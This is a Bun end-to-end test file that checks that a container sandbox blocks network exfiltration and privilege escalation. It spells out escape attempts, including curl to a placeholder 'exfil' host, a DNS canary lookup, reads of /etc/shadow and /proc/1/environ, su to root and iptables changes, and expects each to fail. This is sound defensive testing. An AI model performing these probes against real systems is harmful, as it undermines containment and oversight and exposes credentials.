import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { createSystemClock } from "#platform/clock/index.js";
import { assertSafeContainerMounts } from "#test/e2e-mounts.js";
import { createHostService } from "./utils/host-service.js";
import {
  cleanupProject,
  createTempProject,
  writeProjectFile,
} from "./utils/project.js";
import {
  assertSandboxSuccess,
  createSandbox,
  type SandboxInstance,
} from "./utils/sandbox.js";

const CANARY = "s3cr3t-exfil-canary";
let projectDir: string;
let sb: SandboxInstance;
let service: Awaited<ReturnType<typeof createHostService>>;
let hostAddress: string;

function proxyRequest(url: string, ...args: string[]) {
  return sb.run(
    "curl",
    "-sS",
    "--max-time",
    "10",
    "--noproxy",
    "",
    "--proxy",
    "http://127.0.0.1:8888",
    ...args,
    url,
  );
}

async function assertGuest(script: string): Promise<void> {
  const result = await sb.run(
    "/usr/bin/node",
    "--input-type=module",
    "-e",
    `
import assert from 'node:assert/strict';
import { existsSync, readFileSync, readdirSync, statSync, writeFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
const deny = (action) => assert.throws(action, error => ['EACCES', 'EPERM', 'EROFS'].includes(error.code));
${script}`,
  );
  assertSandboxSuccess(result);
}

async function waitForNetworkObservation(expected: string): Promise<void> {
  const clock = createSystemClock();
  const deadline = clock.now() + 10_000;
  let output = "";

  while (clock.now() < deadline) {
    const logs = await sb.networkLogs("--raw");
    assertSandboxSuccess(logs);
    output = logs.stdout;
    if (output.includes(expected)) return;
    await clock.sleep(250);
  }

  expect(output).toContain(expected);
}

beforeAll(async () => {
  service = await createHostService();
  projectDir = await createTempProject("security");
  await writeProjectFile(
    projectDir,
    ".sandbox/config.toml",
    `allow_network = ["${service.hostName}:*"]\n`,
  );
  await writeProjectFile(
    projectDir,
    ".sandbox/docker/Dockerfile",
    `FROM sandbox-base:latest
ENV SANDBOX_IDLE_TIMEOUT_SECONDS=60
`,
  );
  sb = createSandbox({ cwd: projectDir, timeoutSeconds: 60 });
  assertSandboxSuccess(await sb.build());
  const control = await proxyRequest(
    `http://${service.hostName}:${service.port}/control`,
  );
  assertSandboxSuccess(control);
  expect(control.stdout).toBe("controlled-host-service\n");
  const lookup = await sb.run("getent", "ahostsv4", service.hostName);
  assertSandboxSuccess(lookup);
  hostAddress = lookup.stdout.trim().split(/\s+/)[0] ?? "";
  expect(hostAddress).toMatch(/^\d+\.\d+\.\d+\.\d+$/);
  service.requests.length = 0;
}, 360_000);

afterAll(async () => {
  await cleanupProject(projectDir, sb);
  if (service) await service[Symbol.asyncDispose]();
}, 30_000);

describe("network security boundaries", () => {
  test("rejects direct TCP to a reachable host service at the firewall", async () => {
    const result = await sb.run(
      "curl",
      "-sS",
      "--noproxy",
      "*",
      "--max-time",
      "5",
      `http://${hostAddress}:${service.port}/direct-bypass`,
    );
    expect(result.exitCode, result.stderr).toBe(7);
    await waitForNetworkObservation(`> ${hostAddress}.${service.port}:`);
    expect(
      service.requests.some((request) => request.path === "/direct-bypass"),
    ).toBe(false);
  }, 60_000);

  test("rejects an unlisted HTTP proxy destination with an explicit 403", async () => {
    const result = await proxyRequest(
      "http://unlisted.invalid/exfil",
      "--write-out",
      "\n%{http_code}\n",
    );
    assertSandboxSuccess(result);
    expect(result.stdout).toContain("HTTP 403 Blocked");
    expect(result.stdout).toEndWith("\n403\n");
  });

  test("rejects a subdomain of the exact allowed host", async () => {
    const result = await proxyRequest(
      `http://child.${service.hostName}:${service.port}/`,
      "--write-out",
      "\n%{http_code}\n",
    );
    assertSandboxSuccess(result);
    expect(result.stdout).toContain("HTTP 403 Blocked");
    expect(result.stdout).toEndWith("\n403\n");
  });

  test("rejects an unlisted CONNECT destination with an explicit 403", async () => {
    const result = await proxyRequest("https://unlisted.invalid/exfil");
    expect(result.exitCode, result.stderr).toBe(56);
    expect(result.stderr).toContain("CONNECT tunnel failed, response 403");
  });

  test("rejects a literal IP proxy destination with an explicit 403", async () => {
    const result = await proxyRequest(
      `http://${hostAddress}:${service.port}/literal-ip`,
      "--write-out",
      "\n%{http_code}\n",
    );
    assertSandboxSuccess(result);
    expect(result.stdout).toContain("HTTP 403 Blocked");
    expect(result.stdout).toEndWith("\n403\n");
    expect(
      service.requests.some((request) => request.path === "/literal-ip"),
    ).toBe(false);
  });

  test("permits an explicitly allowed IP address and port", async () => {
    const result = await sb.exec([
      "--allow-network",
      `${hostAddress}:${service.port}`,
      "run",
      "--",
      "curl",
      "-fsS",
      "--max-time",
      "10",
      "--noproxy",
      "",
      "--proxy",
      "http://127.0.0.1:8888",
      `http://${hostAddress}:${service.port}/allowed-literal-ip`,
    ]);
    assertSandboxSuccess(result);
    expect(result.stdout).toBe("controlled-host-service\n");
    expect(
      service.requests.some(
        (request) => request.path === "/allowed-literal-ip",
      ),
    ).toBe(true);
  });

  test("answers a blocked DNS canary locally without forwarding it", async () => {
    const domain = `${CANARY}.unlisted.invalid`;
    const query = await sb.run("nslookup", domain);
    expect(query.exitCode).toBe(1);
    expect(query.stdout + query.stderr).toContain("NXDOMAIN");
    const logs = await sb.networkLogs("--raw");
    assertSandboxSuccess(logs);
    expect(logs.stdout).toContain(`config ${domain} is NXDOMAIN`);
    expect(logs.stdout).not.toContain(`forwarded ${domain}`);
  });

  test("cannot create a raw ICMP socket", async () => {
    const result = await sb.run(
      "python3",
      "-c",
      `
from contextlib import closing
import socket
import unittest

with unittest.TestCase().assertRaises(PermissionError):
    with closing(socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)):
        pass
`,
    );
    assertSandboxSuccess(result);
  });

  test("delivers POST data to an explicitly allowed host service", async () => {
    const result = await proxyRequest(
      `http://${service.hostName}:${service.port}/allowed-post`,
      "--data",
      CANARY,
      "--write-out",
      "\n%{http_code}\n",
    );
    assertSandboxSuccess(result);
    expect(result.stdout).toEndWith("\n200\n");
    expect(service.requests).toContainEqual({
      method: "POST",
      path: "/allowed-post",
      body: CANARY,
    });
  });
});

describe("privilege and filesystem boundaries", () => {
  test("runs as the sandbox user without sudo", async () => {
    await assertGuest(`assert.equal(process.getuid(), Number(execFileSync('id', ['-u', 'sandbox'], { encoding: 'utf8' }).trim()));
assert.notEqual(process.getuid(), 0);
assert.throws(() => execFileSync('sudo', ['-n', 'id']), error => error.code === 'ENOENT' || (error.status === 1 && /not allowed|password is required|not in the sudoers/i.test(error.stderr.toString())));`);
  });

  test("rejects authentication as root", async () => {
    const result = await sb.exec(["run", "--", "su", "-c", "id", "root"], {
      stdin: "\n",
    });
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toMatch(/Authentication failure|Permission denied/);
  });

  test("rejects a real firewall modification", async () => {
    const result = await sb.run(
      "/usr/sbin/iptables",
      "-A",
      "OUTPUT",
      "-d",
      "127.0.0.1",
      "-j",
      "ACCEPT",
    );
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toMatch(/Permission denied|Operation not permitted/);
  });

  test.each(["dnsmasq", "squid"])(
    "cannot signal the running %s service",
    async (daemon) => {
      await assertGuest(`const pids = execFileSync('pgrep', ['-x', ${JSON.stringify(daemon)}], { encoding: 'utf8' }).trim().split(/\\s+/).map(Number);
assert.ok(pids.length > 0);
for (const pid of pids) {
  assert.ok(existsSync('/proc/' + pid));
  assert.throws(() => process.kill(pid, 'SIGTERM'), { code: 'EPERM' });
  assert.ok(existsSync('/proc/' + pid));
}`);
    },
  );

  test("cannot change the active DNS resolver configuration", async () => {
    await assertGuest(`const file = '/etc/resolv.conf';
const before = readFileSync(file, 'utf8');
deny(() => writeFileSync(file, before + '\\n'));
assert.equal(readFileSync(file, 'utf8'), before);`);
  });

  test("cannot change active Squid ACL files", async () => {
    await assertGuest(`const files = readdirSync('/var/run').filter(name => /^proxy-allowed-domains-\\d+\\.txt$/.test(name));
assert.ok(files.length > 0);
for (const name of files) {
  const file = '/var/run/' + name;
  const before = readFileSync(file, 'utf8');
  deny(() => writeFileSync(file, before + '\\n'));
  assert.equal(readFileSync(file, 'utf8'), before);
}`);
  });

  test.each(["/etc/shadow", "/proc/1/environ"])(
    "cannot read protected file %s",
    async (file) => {
      await assertGuest(`assert.ok(statSync(${JSON.stringify(file)}).isFile());
deny(() => readFileSync(${JSON.stringify(file)}));`);
    },
  );

  test("cannot list the root home directory", async () => {
    await assertGuest(
      "assert.ok(statSync('/root').isDirectory()); deny(() => readdirSync('/root'));",
    );
  });

  test("does not expose container runtime control sockets", async () => {
    await assertGuest(`for (const file of ['/var/run/docker.sock', '/run/podman/podman.sock', '/run/user/' + process.getuid() + '/podman/podman.sock']) {
  assert.equal(existsSync(file), false, file);
}`);
  });

  test("exposes only expected mounts and read-only runtime contents", async () => {
    assertSafeContainerMounts(await sb.run("mount"), projectDir);
  });
});
